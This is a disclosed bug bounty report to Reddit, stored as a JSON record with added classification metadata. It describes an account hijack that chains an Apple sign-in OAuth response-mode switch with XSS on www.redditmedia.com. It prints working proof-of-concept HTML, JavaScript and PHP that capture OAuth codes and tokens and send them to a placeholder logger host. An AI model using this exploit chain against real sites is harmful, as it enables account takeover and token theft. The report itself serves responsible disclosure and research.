{
  "reported_to": "Reddit",
  "reported_by": "fransrosen ",
  "title": "One-click account hijack for anyone using Apple sign-in with Reddit, due to response-type switch + leaking href to XSS on www.redditmedia.com",
  "content": "\nHi,\nDescription\nI've been researching new ways to steal OAuth codes and access-tokens using postMessage, and I found a way for me to steal the code and/or access-token from Apple-sign-in on reddit.com allowing a full account hijack of the account in Reddit.\nThe way it works is this:\nAttacker prepares a state-parameter in its own browser from the regular Apple sign-in flow in Reddit. This is an important part on how we get the code.\nAttacker makes a page for the victim with the attacker's state attached to it. The page loads an iframe with www.redditmedia.com, which is an intentional sandbox but with a fun quirk, it uses window.name of the frame to pass over query parameters for the current URL in the main window of Reddit. This also includes fragment, which is what we need to get the tokens.\nThe javascript in the www.redditmedia.com sandbox will create a link to Apple sign-in for Reddit, but tainted with the state-value that the attacker set. Also, the response_type is modified from code to code+id_token and the response_mode to fragment. This is the second important part why we can steal the code, since Reddit uses response_mode=web_message live, to get the message as a postMessage from the login popup, but the other response modes in Apple-ID are not disabled by Reddit. Reddit is not expecting to get any sensitive tokens in the URL fragment. Also, the redirect_uri set in the OAuth-application in Apple for Reddit is allowing https://reddit.com only as the return page. This is something you need to remove, or point elsewhere. When you're using response_mode=web_message, the redirect_uri doesn't really matter what it is set to, since the whole origin of https://reddit.com will be allowed to get the postMessage. But since we now can direct the tokens to Reddit's main page, we have the iframe of www.redditmedia.com there to catch the tokens.\nVictim clicks the link from the attacker page, will go through \"sign-in with Apple\" for Reddit, but with the attacker's state-parameter. When the login process is completed, the URL of the main page becomes https://reddit.com/#state=xxx&code=xxx&access_token=xx.\nThe XSS on www.redditmedia.com in the first window, which has the same domain as the iframe, will be allowed to ask about the window.name of the iframe in the main window, since it's the same origin as the iframe on the attacker's page. It will then be able to steal the current URL that has the tokens in it.\nHere's a video to show the flow, as you will see in the beginning - the attacker has the red profile in Chrome. He will open his own session with Apple and copy the state to the attacker-page, and then send the link to the victim (in the gray profile of Chrome). When the code shows up on the attacker's page later, that's where the attacker then takes over again and uses its incognito browser window to sign in as the victim by posting the postMessage from his Apple-ID sign in popup to Reddit:\nAnd here's a link for testing:\nCode 48 Bytes\n1https://fransrosen.com/reddit-hijack-424342.html\nTechnical details\nHere's the HTML of the malicious page:\nCode 3.07 KiB\n1<html>\n2<style>pre { word-break: break-word; white-space: pre-wrap; }</style>\n3<body>\n4<div id=\"start\">\n5Attacker, enter your Apple ID-OAuth URL when trying to <a href=\"https://reddit.com\" target=\"_blank\">sign in to Reddit here</a>:<br />\n6<input id=\"state\">\n7<button onclick=\"launch(extractstate(document.getElementById('state').value), true)\">Generate a victim URL with attacker's state</button>\n8</div>\n9\n10\n11<div id=\"fr\"></div>\n12\n13<script>\n14var inj, monitor;\n15function extractstate(st) {\n16    return st.indexOf('&state=') !== -1 ? st.split('&state=')[1].split('&')[0] : st;\n17}\n18function startmonitor(st) {\n19    history.pushState('/','/',location.pathname + '?monitor&state=' + st)\n20    monitor = setInterval(function() {\n21        fetch('https://MY-LOGGER-DOMAIN/reddit/parse.php?q=' + st).then(e => e.text()).then(e => {\n22            if (e.length) {\n23                document.getElementById('fr').innerText = 'Attacker, log in to Reddit by running this in the console from Apple-ID popup: ';\n24                var p = document.createElement('pre');\n25                p.innerText = 'opener.postMessage(\\'' + unescape(e.trim()) + '\\',\"*\");';\n26                document.getElementById('fr').appendChild(p)\n27                clearInterval(monitor);\n28            }\n29        });\n30    }, 2000);\n31}\n32function launch(st, showonly) {\n33    if (showonly) {\n34        history.pushState('/','/',location.pathname + '?state=' + st)\n35        document.getElementById('fr').innerText = 'Send this link to victim: ';\n36        var p = document.createElement('pre');\n37        p.innerText = location.href;\n38        document.getElementById('fr').appendChild(p);\n39        startmonitor(st);\n40    } else {\n41        document.getElementById('fr').innerHTML = '<iframe src=\"https://www.redditmedia.com/gtm/jail?id=GTM-N3HH8D6&state=' + encodeURIComponent(st) + '\" frameborder=0 style=\"width: 500px; height: 300px\"></iframe>';\n42    }\n43    document.getElementById('start').innerHTML = '';\n44}\n45if (location.search && location.search.split('state=')[1].split('&')[0]) {\n46    launch(location.search.split('state=')[1].split('&')[0], location.search.indexOf('monitor') !== -1);\n47}\n48window.onmessage = function(e) {\n49    if (e.data === 'stopinject') {\n50        console.log('frame injected');\n51        clearInterval(inj)\n52    }\n53    if (e.data.indexOf('id_token') !== -1 || e.data.indexOf('code') !== -1) {\n54        payload = JSON.parse(e.data);\n55        data = payload.hash.replace('state=state=', 'state=');\n56        var state = data.split('state=')[1].split('&')[0];\n57        var code = data.split('code=')[1].split('&')[0];\n58        var id_token = data.split('id_token=')[1].split('&')[0];\n59        var payload = JSON.stringify({method:'oauthDone',data:{authorization:{code:code,id_token:id_token,state:state}}});\n60\n61        document.getElementById('fr').innerHTML = 'Attacker now have the code from Apple:<br />';\n62        var p = document.createElement('pre');\n63        p.innerText = payload;\n64        document.getElementById('fr').appendChild(p);\n65\n66        var s = document.createElement('img');\n67        s.src = 'https://MY-LOGGER-DOMAIN/reddit/log.php?' + payload;\n68        document.body.appendChild(s);   \n69    }\n70}\n71\n72</script>\n73\n74\n75</body>\n76</html>\nWhat this page will do is:\nAsk the attacker to prepare the state-param from its own browser. This is to taint the victim's code with the state so that the attacker can then sign in. This will also start to monitor the log asking for any code from the state provided.\n<image_0>\n<image_1>\nLoad the https://www.redditmedia.com with my own custom GTM into an iframe. It is not restricted to be framed in any way, anyone can load it.\nThe GTM-script will load, it looks like this:\nCode 1.06 KiB\n1<script>var b, x;\n2var state = parent.location.href.substr(location.href.indexOf('state='));\n3var d = document.createElement('div');\n4if (!window.inited) {\n5  window.inited = true;\n6d.innerHTML = '<a href=\"#\" onclick=\"b=window.open(\\'https://appleid.apple.com/auth/authorize?client_id=com.reddit.RedditAppleSSO&redirect_uri=https%3A%2F%2Fwww.reddit.com&response_type=code+id_token&state=' + state + '&scope=&response_mode=fragment&m=12&v=1.5.4\\');\">Click here to hijack Apple access-token for Reddit</a>';\n7parent.document.children[parent.document.children.length - 1].appendChild(d);\n8if(top!==parent.window) top.postMessage('stopinject', '*');\n9parent.window.onmessage=function(e) { if(e.data.indexOf('id_token') !== -1 || e.data.indexOf('code') !== -1) { top.postMessage(e.data, '*'); b.close(); } };\n10x = setInterval(function() {\n11if(parent.window.b && parent.window.b.frames[0] && parent.window.b.frames[0].window && parent.window.b.frames[0].window.name) {\n12  top.postMessage(parent.window.b.frames[0].window.name, '*'); parent.window.b.close();\n13  clearInterval(x);\n14};\n15\n16}, 500);\n17}\n18</script>\nThis javascript will render the \"Click here\"-link:\n<image_2>\nIt will ask the parent window to stop injecting by postMessage, and it will run an interval looking for the frames[1].window.name, which is the regular www.redditmedia.com iframe of the window that was opened, as soon as it contains code, the value will be sent to the attacker main window through this frame.\n5. The attacker's main window will listen for a postMessage containing code and will show the state+code in the window. The page will then load an external logging-URL with the payload.\n<image_3>\nThe attacker now gets the token from the victim in his browser thanks to the monitoring of the log on my server:\n<image_4>\nLogging endpoints\nI've added some endpoints in the HTML to log and parse the log to extract the code-parameter. You need to use your own endpoints if you don't want to try mine above from my link.\nhttps://USE-YOUR-OWN-LOGGER/reddit/log.php looks like this:\nCode 120 Bytes\n1<?php\n2\n3if (isset($_SERVER['QUERY_STRING'])) {\n4\tfile_put_contents('r.log', $_SERVER['QUERY_STRING'].\"\\n\", FILE_APPEND);\n5}\nAnd https://USE-YOUR-OWN-LOGGER/reddit/parse.php looks like this:\nCode 313 Bytes\n1<?php\n2header(\"Access-Control-Allow-Origin: *\");\n3header(\"Content-type: text/plain\");\n4\n5$key = @$_GET['q'];\n6if (!$key || !preg_match('#^[a-f0-9]{48}$#', $key)) { die; }\n7$data = explode(\"\\n\", file_get_contents('r.log'));\n8foreach($data as $line) {\n9\tif (strpos($line, $key) !== false) {\n10\t\techo $line . \"\\n\";\n11\t\tdie;\n12\t}\n13}\nMitigation\nRemove fragment part when location is sent to www.redditmedia.com or any other party.\nRestrict your redirect_uri of Apple-ID to something that does not load a domain that could run arbitrary javascript.\nImpact\nAttacker can sign in as the victim. There's minimal interaction needed, only one click.\nThis took quite some time to get built :) I hope you'll like it!\nRegards,\nFrans\n\n",
  "severity": [
    9.0,
    10.0
  ],
  "bounty": null,
  "weaknesses": [
    "Improper Access Control - Generic"
  ],
  "screenshots": {
    "image_0": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/jrk3eil8v72jaz2md1kjaooctu6z?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2022-05-12_at_15.52.53.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2022-05-12_at_15.52.53.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWQGXSBXN%2F20250325%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250325T021605Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEKD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCICL9dLlc89zR9lWPHTHZnvseQXyEMcGTWYlb6FWx6TJgAiEA3MwTlcW5w4W1sm7JA2m%2FwE4DwhSsA%2BILIFqXmpfMkqgqugUI%2Bf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDMhJWDpoV8sZ1e1kiCqOBVix4EJPob2Z2jf8ATznVl%2FPbS%2FVrmN6bkBOKwkJlXi7YswhFarPkgIUiGbl52Lv9x7BXxxluhO9flf1yyEcRZxXCai%2Bx5sPYQp5McdiJ2cjkoGcdylSxDTEx1B%2Fq%2ByXqByp%2FPIMDx%2FOdG6E0WXdhtp4bSI4KciW90ncMo1IW71jmG9bCR7dH%2BpsechltBfnBpeSV9U3aKTmwBawaxjniCYBwzO0SVayP%2F2iX1wWzbAdppFEUW9PABUIy4%2FO9%2FCLPMbXtUHy2TIPXk%2F7fB%2FXsxk%2Bu3nDFBI69Emw%2BzsYmsW%2F5K%2Fw1MGhVC8etjfVLIvS8sLN7OA3gvU2xdCqXTnDvjniYwmbrWKAYKMr75yWrNqPgr%2BI6Ac3ATdbT5Q8loagXJvWO5KkWVOZbvvTLaZqW5KexwU5VOVB9G%2FVehCUGqrIr6dcegeV1asnVgHxOOh7N%2FNM%2Bq8PTlfS2CmCGBqg8jkfa3x3Z5SD2DxRWkyEodPKsdVQ%2FYEHCAOtdJtQf9J5%2FhSOAj83DSdBsomZHVWS2evprozz3dB1qMA3sEV%2BONFdO%2FAyrK6qQalFsjaY1Z%2BRgFNYkw2IqEGTj6uPIYFO05bEc0WMGXX2RiY2QxYX7uvsN2Z4V9%2FCWQuCHvFDqEihK0f5LiQ9sDrzzRTKb4oHy4sQD%2BDGipbZoXTwfH%2F%2BiieKcjxPAI8VQxcace6jc%2BXSR3KWnbtURRKDZmXuz7ZCsZA2TWxVLY6PinzVjAx0Yup2%2BowPf2PyK8EC3FCId%2FVUmPUiSMpLH%2BrjU05FWjFp3y4ZewsMmIOuD80U4%2BeLfuYVFxClHQ4swHykNsUI0KOFsnhBVRTTIf0gjnrLGxyBHT9iGrB%2FFadR1C8FadfxQzCb3oe%2FBjqxAaZ5ah3Ca5ld0s6exd9jGEDdTxcB3b%2FLwXw8PbEXo9H%2BrDDlyYeCXCLQDKLNKZGhx3K0D9dnaCoTOoj%2F32gBxy74lpzBFru0%2BJuOhQLijB5Nzb8%2BGCrtUztTBFMBSBGNCxb8NAMHzjZpFbU6NF1e8jYS48cOlHYFN%2Fb2ArxaoSSxVoqkSaRrRc1q3Nh4MQvEw1MIcZV9Ric1kb%2FVv79Rm7oStPy1LL5KBuo2BbN%2FJ1TqgQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=601e856a74096ab7bd71196b55106ce00de6789197cbc5971102c434cb33d841",
    "image_1": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/vgsdqpaaml5q8kvhyrg74ksuo7ea?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2022-05-12_at_15.52.59.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2022-05-12_at_15.52.59.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWQGXSBXN%2F20250325%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250325T021605Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEKD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCICL9dLlc89zR9lWPHTHZnvseQXyEMcGTWYlb6FWx6TJgAiEA3MwTlcW5w4W1sm7JA2m%2FwE4DwhSsA%2BILIFqXmpfMkqgqugUI%2Bf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDMhJWDpoV8sZ1e1kiCqOBVix4EJPob2Z2jf8ATznVl%2FPbS%2FVrmN6bkBOKwkJlXi7YswhFarPkgIUiGbl52Lv9x7BXxxluhO9flf1yyEcRZxXCai%2Bx5sPYQp5McdiJ2cjkoGcdylSxDTEx1B%2Fq%2ByXqByp%2FPIMDx%2FOdG6E0WXdhtp4bSI4KciW90ncMo1IW71jmG9bCR7dH%2BpsechltBfnBpeSV9U3aKTmwBawaxjniCYBwzO0SVayP%2F2iX1wWzbAdppFEUW9PABUIy4%2FO9%2FCLPMbXtUHy2TIPXk%2F7fB%2FXsxk%2Bu3nDFBI69Emw%2BzsYmsW%2F5K%2Fw1MGhVC8etjfVLIvS8sLN7OA3gvU2xdCqXTnDvjniYwmbrWKAYKMr75yWrNqPgr%2BI6Ac3ATdbT5Q8loagXJvWO5KkWVOZbvvTLaZqW5KexwU5VOVB9G%2FVehCUGqrIr6dcegeV1asnVgHxOOh7N%2FNM%2Bq8PTlfS2CmCGBqg8jkfa3x3Z5SD2DxRWkyEodPKsdVQ%2FYEHCAOtdJtQf9J5%2FhSOAj83DSdBsomZHVWS2evprozz3dB1qMA3sEV%2BONFdO%2FAyrK6qQalFsjaY1Z%2BRgFNYkw2IqEGTj6uPIYFO05bEc0WMGXX2RiY2QxYX7uvsN2Z4V9%2FCWQuCHvFDqEihK0f5LiQ9sDrzzRTKb4oHy4sQD%2BDGipbZoXTwfH%2F%2BiieKcjxPAI8VQxcace6jc%2BXSR3KWnbtURRKDZmXuz7ZCsZA2TWxVLY6PinzVjAx0Yup2%2BowPf2PyK8EC3FCId%2FVUmPUiSMpLH%2BrjU05FWjFp3y4ZewsMmIOuD80U4%2BeLfuYVFxClHQ4swHykNsUI0KOFsnhBVRTTIf0gjnrLGxyBHT9iGrB%2FFadR1C8FadfxQzCb3oe%2FBjqxAaZ5ah3Ca5ld0s6exd9jGEDdTxcB3b%2FLwXw8PbEXo9H%2BrDDlyYeCXCLQDKLNKZGhx3K0D9dnaCoTOoj%2F32gBxy74lpzBFru0%2BJuOhQLijB5Nzb8%2BGCrtUztTBFMBSBGNCxb8NAMHzjZpFbU6NF1e8jYS48cOlHYFN%2Fb2ArxaoSSxVoqkSaRrRc1q3Nh4MQvEw1MIcZV9Ric1kb%2FVv79Rm7oStPy1LL5KBuo2BbN%2FJ1TqgQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=00237fb3f497e24cafa2c1493c991eeaf6a6edd15a312f24ec0ced7f789c99f2",
    "image_2": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/b0mce3rvv3c4sj4q6i2ak7ef6j0n?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2022-05-12_at_15.54.23.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2022-05-12_at_15.54.23.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWQGXSBXN%2F20250325%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250325T021605Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEKD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCICL9dLlc89zR9lWPHTHZnvseQXyEMcGTWYlb6FWx6TJgAiEA3MwTlcW5w4W1sm7JA2m%2FwE4DwhSsA%2BILIFqXmpfMkqgqugUI%2Bf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDMhJWDpoV8sZ1e1kiCqOBVix4EJPob2Z2jf8ATznVl%2FPbS%2FVrmN6bkBOKwkJlXi7YswhFarPkgIUiGbl52Lv9x7BXxxluhO9flf1yyEcRZxXCai%2Bx5sPYQp5McdiJ2cjkoGcdylSxDTEx1B%2Fq%2ByXqByp%2FPIMDx%2FOdG6E0WXdhtp4bSI4KciW90ncMo1IW71jmG9bCR7dH%2BpsechltBfnBpeSV9U3aKTmwBawaxjniCYBwzO0SVayP%2F2iX1wWzbAdppFEUW9PABUIy4%2FO9%2FCLPMbXtUHy2TIPXk%2F7fB%2FXsxk%2Bu3nDFBI69Emw%2BzsYmsW%2F5K%2Fw1MGhVC8etjfVLIvS8sLN7OA3gvU2xdCqXTnDvjniYwmbrWKAYKMr75yWrNqPgr%2BI6Ac3ATdbT5Q8loagXJvWO5KkWVOZbvvTLaZqW5KexwU5VOVB9G%2FVehCUGqrIr6dcegeV1asnVgHxOOh7N%2FNM%2Bq8PTlfS2CmCGBqg8jkfa3x3Z5SD2DxRWkyEodPKsdVQ%2FYEHCAOtdJtQf9J5%2FhSOAj83DSdBsomZHVWS2evprozz3dB1qMA3sEV%2BONFdO%2FAyrK6qQalFsjaY1Z%2BRgFNYkw2IqEGTj6uPIYFO05bEc0WMGXX2RiY2QxYX7uvsN2Z4V9%2FCWQuCHvFDqEihK0f5LiQ9sDrzzRTKb4oHy4sQD%2BDGipbZoXTwfH%2F%2BiieKcjxPAI8VQxcace6jc%2BXSR3KWnbtURRKDZmXuz7ZCsZA2TWxVLY6PinzVjAx0Yup2%2BowPf2PyK8EC3FCId%2FVUmPUiSMpLH%2BrjU05FWjFp3y4ZewsMmIOuD80U4%2BeLfuYVFxClHQ4swHykNsUI0KOFsnhBVRTTIf0gjnrLGxyBHT9iGrB%2FFadR1C8FadfxQzCb3oe%2FBjqxAaZ5ah3Ca5ld0s6exd9jGEDdTxcB3b%2FLwXw8PbEXo9H%2BrDDlyYeCXCLQDKLNKZGhx3K0D9dnaCoTOoj%2F32gBxy74lpzBFru0%2BJuOhQLijB5Nzb8%2BGCrtUztTBFMBSBGNCxb8NAMHzjZpFbU6NF1e8jYS48cOlHYFN%2Fb2ArxaoSSxVoqkSaRrRc1q3Nh4MQvEw1MIcZV9Ric1kb%2FVv79Rm7oStPy1LL5KBuo2BbN%2FJ1TqgQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=28ab6be7eb3cdc35d07b504f47d2fcb1a73728165a0a12a9e23596ea0df392a1",
    "image_3": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/0c7wp5yo4mofb524hukxlu09m6x4?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2022-05-12_at_16.00.54.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2022-05-12_at_16.00.54.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWQGXSBXN%2F20250325%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250325T021605Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEKD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCICL9dLlc89zR9lWPHTHZnvseQXyEMcGTWYlb6FWx6TJgAiEA3MwTlcW5w4W1sm7JA2m%2FwE4DwhSsA%2BILIFqXmpfMkqgqugUI%2Bf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDMhJWDpoV8sZ1e1kiCqOBVix4EJPob2Z2jf8ATznVl%2FPbS%2FVrmN6bkBOKwkJlXi7YswhFarPkgIUiGbl52Lv9x7BXxxluhO9flf1yyEcRZxXCai%2Bx5sPYQp5McdiJ2cjkoGcdylSxDTEx1B%2Fq%2ByXqByp%2FPIMDx%2FOdG6E0WXdhtp4bSI4KciW90ncMo1IW71jmG9bCR7dH%2BpsechltBfnBpeSV9U3aKTmwBawaxjniCYBwzO0SVayP%2F2iX1wWzbAdppFEUW9PABUIy4%2FO9%2FCLPMbXtUHy2TIPXk%2F7fB%2FXsxk%2Bu3nDFBI69Emw%2BzsYmsW%2F5K%2Fw1MGhVC8etjfVLIvS8sLN7OA3gvU2xdCqXTnDvjniYwmbrWKAYKMr75yWrNqPgr%2BI6Ac3ATdbT5Q8loagXJvWO5KkWVOZbvvTLaZqW5KexwU5VOVB9G%2FVehCUGqrIr6dcegeV1asnVgHxOOh7N%2FNM%2Bq8PTlfS2CmCGBqg8jkfa3x3Z5SD2DxRWkyEodPKsdVQ%2FYEHCAOtdJtQf9J5%2FhSOAj83DSdBsomZHVWS2evprozz3dB1qMA3sEV%2BONFdO%2FAyrK6qQalFsjaY1Z%2BRgFNYkw2IqEGTj6uPIYFO05bEc0WMGXX2RiY2QxYX7uvsN2Z4V9%2FCWQuCHvFDqEihK0f5LiQ9sDrzzRTKb4oHy4sQD%2BDGipbZoXTwfH%2F%2BiieKcjxPAI8VQxcace6jc%2BXSR3KWnbtURRKDZmXuz7ZCsZA2TWxVLY6PinzVjAx0Yup2%2BowPf2PyK8EC3FCId%2FVUmPUiSMpLH%2BrjU05FWjFp3y4ZewsMmIOuD80U4%2BeLfuYVFxClHQ4swHykNsUI0KOFsnhBVRTTIf0gjnrLGxyBHT9iGrB%2FFadR1C8FadfxQzCb3oe%2FBjqxAaZ5ah3Ca5ld0s6exd9jGEDdTxcB3b%2FLwXw8PbEXo9H%2BrDDlyYeCXCLQDKLNKZGhx3K0D9dnaCoTOoj%2F32gBxy74lpzBFru0%2BJuOhQLijB5Nzb8%2BGCrtUztTBFMBSBGNCxb8NAMHzjZpFbU6NF1e8jYS48cOlHYFN%2Fb2ArxaoSSxVoqkSaRrRc1q3Nh4MQvEw1MIcZV9Ric1kb%2FVv79Rm7oStPy1LL5KBuo2BbN%2FJ1TqgQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=d38088fa6441df59531c5325a867376e7be4f189ab652b4eb5437a724a6bf29c",
    "image_4": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/fu6metvwusj8br8u4xbjea7dtpqh?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2022-05-12_at_16.00.32.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2022-05-12_at_16.00.32.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWQGXSBXN%2F20250325%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250325T021605Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEKD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCICL9dLlc89zR9lWPHTHZnvseQXyEMcGTWYlb6FWx6TJgAiEA3MwTlcW5w4W1sm7JA2m%2FwE4DwhSsA%2BILIFqXmpfMkqgqugUI%2Bf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDMhJWDpoV8sZ1e1kiCqOBVix4EJPob2Z2jf8ATznVl%2FPbS%2FVrmN6bkBOKwkJlXi7YswhFarPkgIUiGbl52Lv9x7BXxxluhO9flf1yyEcRZxXCai%2Bx5sPYQp5McdiJ2cjkoGcdylSxDTEx1B%2Fq%2ByXqByp%2FPIMDx%2FOdG6E0WXdhtp4bSI4KciW90ncMo1IW71jmG9bCR7dH%2BpsechltBfnBpeSV9U3aKTmwBawaxjniCYBwzO0SVayP%2F2iX1wWzbAdppFEUW9PABUIy4%2FO9%2FCLPMbXtUHy2TIPXk%2F7fB%2FXsxk%2Bu3nDFBI69Emw%2BzsYmsW%2F5K%2Fw1MGhVC8etjfVLIvS8sLN7OA3gvU2xdCqXTnDvjniYwmbrWKAYKMr75yWrNqPgr%2BI6Ac3ATdbT5Q8loagXJvWO5KkWVOZbvvTLaZqW5KexwU5VOVB9G%2FVehCUGqrIr6dcegeV1asnVgHxOOh7N%2FNM%2Bq8PTlfS2CmCGBqg8jkfa3x3Z5SD2DxRWkyEodPKsdVQ%2FYEHCAOtdJtQf9J5%2FhSOAj83DSdBsomZHVWS2evprozz3dB1qMA3sEV%2BONFdO%2FAyrK6qQalFsjaY1Z%2BRgFNYkw2IqEGTj6uPIYFO05bEc0WMGXX2RiY2QxYX7uvsN2Z4V9%2FCWQuCHvFDqEihK0f5LiQ9sDrzzRTKb4oHy4sQD%2BDGipbZoXTwfH%2F%2BiieKcjxPAI8VQxcace6jc%2BXSR3KWnbtURRKDZmXuz7ZCsZA2TWxVLY6PinzVjAx0Yup2%2BowPf2PyK8EC3FCId%2FVUmPUiSMpLH%2BrjU05FWjFp3y4ZewsMmIOuD80U4%2BeLfuYVFxClHQ4swHykNsUI0KOFsnhBVRTTIf0gjnrLGxyBHT9iGrB%2FFadR1C8FadfxQzCb3oe%2FBjqxAaZ5ah3Ca5ld0s6exd9jGEDdTxcB3b%2FLwXw8PbEXo9H%2BrDDlyYeCXCLQDKLNKZGhx3K0D9dnaCoTOoj%2F32gBxy74lpzBFru0%2BJuOhQLijB5Nzb8%2BGCrtUztTBFMBSBGNCxb8NAMHzjZpFbU6NF1e8jYS48cOlHYFN%2Fb2ArxaoSSxVoqkSaRrRc1q3Nh4MQvEw1MIcZV9Ric1kb%2FVv79Rm7oStPy1LL5KBuo2BbN%2FJ1TqgQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=2cdab2c84a21cba52d063ad32ddb4239dab228813516674bb1a96d237ad1282f"
  },
  "disclosed_date": 1659467580,
  "report_url": "https://hackerone.com/reports/1567186",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "HIGH",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "Attacker prepares a state-parameter from their own Apple sign-in flow with Reddit."
    ],
    [
      2,
      "Attacker creates a malicious page with their state parameter and loads an iframe from www.redditmedia.com."
    ],
    [
      3,
      "Victim clicks a link on the attacker's page, initiating Apple sign-in with the attacker's state parameter."
    ],
    [
      4,
      "After sign-in, tokens appear in the URL fragment of reddit.com, which the attacker's iframe captures via XSS."
    ],
    [
      5,
      "Attacker uses the stolen tokens to hijack the victim's Reddit account."
    ]
  ],
  "vuln_description": "This vulnerability allows an attacker to hijack a victim's Reddit account when using Apple sign-in by manipulating the OAuth flow to leak tokens via URL fragment and capturing them through an XSS in a www.redditmedia.com iframe.",
  "reason": "The attack involves multiple components (OAuth flow manipulation, XSS, iframe communication) and requires understanding subtle interactions between them, such as response_type switching and fragment token leakage. The attacker must also maintain context across these components while crafting the exploit.",
  "new_complexity": "VERY_HIGH",
  "requires_code": false,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "idor_detectable": false,
  "authnz_byppass_detectable": true,
  "is_simple_payload": false,
  "injection_metadata": {
    "is_simple_payload": false
  },
  "authnz_metadata": {
    "reasoning": "The vulnerability involves manipulating OAuth parameters (response_type, response_mode) and exploiting XSS via window.name leakage in a sandboxed domain. The detection methodology focuses on swapping sessions/resource IDs in existing HTTP requests, but this attack requires modifying OAuth flow configuration (response_mode=fragment) and cross-domain message passing via postMessage/XSS - which wouldn't be captured by simple (user_session, action, resource_id) substitution checks. The core issue is OAuth implementation flaws + XSS chaining rather than classic IDOR/AuthZ bypass via parameter tampering.",
    "is_simple_authnz": false
  }
}